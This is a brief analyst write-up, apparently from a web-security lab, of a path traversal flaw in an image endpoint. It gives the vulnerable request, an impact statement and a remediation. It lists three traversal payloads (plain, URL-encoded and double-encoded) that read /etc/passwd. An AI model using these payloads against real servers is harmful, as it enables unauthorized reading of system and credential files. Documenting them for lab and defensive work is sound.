
# PS-007 — Path Traversal: Read Arbitrary File
**Date / Analyst:** 2025-09-10 — Christopher Araque

## TL;DR
Parameter `file`/`path` is not sanitized; traversal sequences allow reading `/etc/passwd`.

## Endpoint
- GET /image?filename=../../../etc/passwd HTTP/2


## Evidence
- Request/Response: [ps-007-request.txt](../../evidence/ps-traversal/ps-007-request.txt)
- Screenshot: ![PS‑007](../../evidence/ps-traversal/ps-007-screenshot.png)

## Payloads (try in Repeater)
../../../../../../etc/passwd
..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252f..%252f..%252fetc%252fpasswd

## Impact
Sensitive file disclosure (configs/keys/creds).

## Fix
Canonicalize path; enforce allow‑list; deny `..` / `%2e` / `%2f` and double‑encoded variants; use chroot/sandbox.
